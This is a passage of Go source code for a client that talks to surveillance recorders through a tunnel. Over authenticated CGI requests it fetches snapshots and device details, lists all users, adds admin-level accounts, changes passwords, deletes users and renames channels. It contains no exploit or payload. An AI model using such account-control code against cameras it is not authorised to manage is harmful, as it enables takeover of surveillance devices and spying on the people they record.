		jpegData := resp[soiIdx:]
		if eoiIdx := bytes.LastIndex(jpegData, []byte{0xFF, 0xD9}); eoiIdx >= 0 {
			return jpegData[:eoiIdx+2], nil
		}
		if len(jpegData) >= 1000 {
			return jpegData, nil
		}
	}

	body := extractBody(resp)
	if len(body) > 2 && body[0] == 0xFF && body[1] == 0xD8 {
		return body, nil
	}

	statusLine := string(resp)
	if idx := strings.Index(statusLine, "\r\n"); idx >= 0 {
		statusLine = statusLine[:idx]
	}
	bodyPreview := string(body[:min(len(body), 120)])
	return nil, fmt.Errorf("snapshot: %s body=%q", statusLine, bodyPreview)
}


func extractBody(resp []byte) []byte {
	idx := findHeaderEnd(resp)
	if idx < 0 {
		return resp
	}
	return resp[idx:]
}

func (t *PTCPTunnel) GetDeviceInfo() (model string, channels int, firmware string, err error) {
	parseKV := func(resp []byte) map[string]string {
		m := make(map[string]string)
		for _, line := range strings.Split(strings.TrimSpace(string(extractBody(resp))), "\n") {
			line = strings.TrimSpace(line)
			if k, v, ok := strings.Cut(line, "="); ok {
				m[strings.TrimSpace(k)] = strings.TrimSpace(v)
			}
		}
		return m
	}

	
	xmlTag := func(body []byte, tag string) string {
		s := string(body)
		open, close := "<"+tag+">", "</"+tag+">"
		if i := strings.Index(s, open); i >= 0 {
			s = s[i+len(open):]
			if j := strings.Index(s, close); j >= 0 {
				return strings.TrimSpace(s[:j])
			}
		}
		return ""
	}

	isNVRErrorPage := func(resp []byte) bool {
		body := extractBody(resp)
		return len(resp) < 350 && (contains(resp, "Error") || contains(resp, "<html") || contains(body, "Error") || contains(body, "<html"))
	}

	type getResult struct {
		resp []byte
		nvrPage bool
	}
	doGet := func(path string) getResult {
		req := fmt.Sprintf("GET %s HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n", path)
		resp, e := t.DoHTTPAuth([]byte(req), 5*time.Second)
		if e != nil {
			return getResult{}
		}
		if isNVRErrorPage(resp) {
			return getResult{nvrPage: true}
		}
		return getResult{resp: resp}
	}

	for _, path := range []string{
		"/cgi-bin/magicBox.cgi?action=getSystemInfo",
		"/cgi-bin/configManager.cgi?action=getConfig&name=General.SystemInfo",
	} {
		r := doGet(path)
		if r.nvrPage {
			return "", 0, "", fmt.Errorf("CGI returns NVR error page")
		}
		if r.resp == nil {
			continue
		}
		body := extractBody(r.resp)
		kv := parseKV(r.resp)
		if m := kv["deviceType"]; m != "" && !hasErrPrefix(m) {
			model = m
			break
		}
		if m := kv["model"]; m != "" && !hasErrPrefix(m) {
			model = m
			break
		}
		
		if m := xmlTag(body, "deviceType"); m != "" && !hasErrPrefix(m) {
			model = m
			break
		}
		if m := xmlTag(body, "model"); m != "" && !hasErrPrefix(m) {
			model = m
			break
		}
	}

	if model == "" {
		for _, path := range []string{
			"/cgi-bin/magicBox.cgi?action=getDeviceType",
			"/cgi-bin/devicemanager.cgi?action=getDeviceType",
		} {
			r := doGet(path)
			if r.nvrPage {
				return "", 0, "", fmt.Errorf("CGI returns NVR error page")
			}
			if r.resp == nil {
				continue
			}
			body := extractBody(r.resp)
			if m := strings.TrimSpace(string(body)); m != "" && !hasErrPrefix(m) {
				
				if v := xmlTag(body, "type"); v != "" {
					m = v
				}
				model = m
				break
			}
		}
	}

	for _, path := range []string{
		"/cgi-bin/magicBox.cgi?action=getSoftwareVersion",
		"/cgi-bin/magicBox.cgi?action=getSystemInfo",
	} {
		r := doGet(path)
		if r.nvrPage {
			break
		}
		if r.resp == nil {
			continue
		}
		body := extractBody(r.resp)
		kv := parseKV(r.resp)
		if fw := kv["version"]; fw != "" {
			firmware = strings.TrimPrefix(fw, "version=")
			break
		}
		if fw := strings.TrimSpace(string(body)); fw != "" && !hasErrPrefix(fw) {
			if v := xmlTag(body, "version"); v != "" {
				fw = v
			}
			firmware = strings.TrimPrefix(fw, "version=")
			break
		}
	}

	r := doGet("/cgi-bin/configManager.cgi?action=getConfig&name=ChannelTitle")
	if !r.nvrPage && r.resp != nil {
		if c := bytes.Count(r.resp, []byte("<table")); c > 0 {
			channels = c
		}
	}
	if channels == 0 {
		channels = 1
	}

	return model, channels, firmware, nil
}

func (t *PTCPTunnel) GetUsers() ([]map[string]string, error) {
	req := "GET /cgi-bin/userManager.cgi?action=getUserInfoAll HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n"
	resp, err := t.DoHTTPAuth([]byte(req), 10*time.Second)
	if err != nil {
		return nil, fmt.Errorf("GetUsers CGI: %w", err)
	}
	body := string(extractBody(resp))
	if strings.Contains(body, "Error") || strings.Contains(body, "<html") {
		return nil, fmt.Errorf("GetUsers CGI: error response")
	}

	var users []map[string]string
	current := map[string]string{}
	currentIdx := -1
	for _, line := range strings.Split(body, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		if !strings.HasPrefix(line, "users[") {
			continue
		}
		close := strings.Index(line, "]")
		if close < 0 {
			continue
		}
		idxStr := line[len("users["):close]
		var idx int
		fmt.Sscanf(idxStr, "%d", &idx)
		rest := line[close+2:] 
		k, v, ok := strings.Cut(rest, "=")
		if !ok {
			continue
		}
		if idx != currentIdx {
			if currentIdx >= 0 && len(current) > 0 {
				users = append(users, current)
			}
			current = map[string]string{}
			currentIdx = idx
		}
		current[strings.TrimSpace(k)] = strings.TrimSpace(v)
	}
	if currentIdx >= 0 && len(current) > 0 {
		users = append(users, current)
	}
	return users, nil
}

func (t *PTCPTunnel) AddUser(userName, password, groupID, authList string) error {
	if authList == "" {
		switch strings.ToLower(groupID) {
		case "admin":
			authList = "Config|Info|Monitor_01|Monitor_02|Monitor_03|Monitor_04|Monitor_05|Monitor_06|Monitor_07|Monitor_08|Monitor_09|Monitor_10|Monitor_11|Monitor_12|Monitor_13|Monitor_14|Monitor_15|Monitor_16|Playback_01|Playback_02|Playback_03|Playback_04|Playback_05|Playback_06|Playback_07|Playback_08|Playback_09|Playback_10|Playback_11|Playback_12|Playback_13|Playback_14|Playback_15|Playback_16"
		default:
			authList = "Monitor_01|Playback_01"
		}
	}
	path := fmt.Sprintf(
		"/cgi-bin/userManager.cgi?action=addUser"+
			"&user.Name=%s"+
			"&user.Password=%s"+
			"&user.Group=%s"+
			"&user.Sharable=true"+
			"&user.Reserved=false"+
			"&user.AuthList=%s",
		urlEncode(userName), urlEncode(password), urlEncode(groupID), urlEncode(authList),
	)
	req := fmt.Sprintf("GET %s HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n", path)
	resp, err := t.DoHTTPAuth([]byte(req), 10*time.Second)
	if err != nil {
		return fmt.Errorf("AddUser CGI: %w", err)
	}
	body := strings.TrimSpace(string(extractBody(resp)))
	if !strings.EqualFold(body, "OK") {
		return fmt.Errorf("AddUser CGI error: %s", body)
	}
	return nil
}

func (t *PTCPTunnel) ModifyPassword(userName, newPassword string) error {
	path := fmt.Sprintf(
		"/cgi-bin/userManager.cgi?action=modifyPassword&name=%s&pwd=%s",
		urlEncode(userName), urlEncode(newPassword),
	)
	req := fmt.Sprintf("GET %s HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n", path)
	resp, err := t.DoHTTPAuth([]byte(req), 10*time.Second)
	if err != nil {
		return fmt.Errorf("ModifyPassword CGI: %w", err)
	}
	body := strings.TrimSpace(string(extractBody(resp)))
	if strings.HasPrefix(body, "Error") || strings.Contains(body, "<html") {
		return fmt.Errorf("ModifyPassword CGI error: %s", body)
	}
	return nil
}

func (t *PTCPTunnel) DeleteUser(userName string) error {
	path := fmt.Sprintf("/cgi-bin/userManager.cgi?action=deleteUser&name=%s", urlEncode(userName))
	req := fmt.Sprintf("GET %s HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n", path)
	resp, err := t.DoHTTPAuth([]byte(req), 10*time.Second)
	if err != nil {
		return fmt.Errorf("DeleteUser CGI: %w", err)
	}
	body := strings.TrimSpace(string(extractBody(resp)))
	if strings.HasPrefix(body, "Error") || strings.Contains(body, "<html") {
		return fmt.Errorf("DeleteUser CGI error: %s", body)
	}
	return nil
}

func (t *PTCPTunnel) SetChannelTitle(channel int, name string) error {
	path := fmt.Sprintf("/cgi-bin/configManager.cgi?action=setConfig&ChannelTitle[%d].Name=%s",
		channel, urlEncode(name))
	req := fmt.Sprintf("GET %s HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n", path)
	resp, err := t.DoHTTPAuth([]byte(req), 10*time.Second)
	if err != nil {
		return fmt.Errorf("SetChannelTitle CGI: %w", err)
	}
	body := strings.TrimSpace(string(extractBody(resp)))
	if !strings.EqualFold(body, "OK") {
		return fmt.Errorf("SetChannelTitle CGI error: %s", body)
	}
	return nil
}

func urlEncode(s string) string {
	var buf strings.Builder
	for _, c := range []byte(s) {
		switch {
		case c >= 'A' && c <= 'Z', c >= 'a' && c <= 'z', c >= '0' && c <= '9',
			c == '-', c == '_', c == '.', c == '~':
			buf.WriteByte(c)
		default:
			fmt.Fprintf(&buf, "%%%02X", c)
		}
	}
	return buf.String()
}

func hasErrPrefix(s string) bool {
	return strings.HasPrefix(s, "Error") || strings.Contains(s, "Bad Request")
}

func findHeaderEnd(data []byte) int {
	for i := 0; i < len(data)-3; i++ {
		if data[i] == '\r' && data[i+1] == '\n' && data[i+2] == '\r' && data[i+3] == '\n' {
			return i + 4
		}
	}
	return -1
}

func parseContentLength(s string) int {
	marker := "Content-Length: "
	idx := strings.Index(s, marker)
	if idx < 0 {
		marker = "content-length: "
		idx = strings.Index(s, marker)
	}
	if idx < 0 {
		return 0
	}
	val := 0
	for _, c := range s[idx+len(marker):] {
		if c >= '0' && c <= '9' {
			val = val*10 + int(c-'0')
		} else {
			break
		}
	}
	return val
}

func contains(data []byte, substr string) bool {
	return bytes.Contains(data, []byte(substr))
}
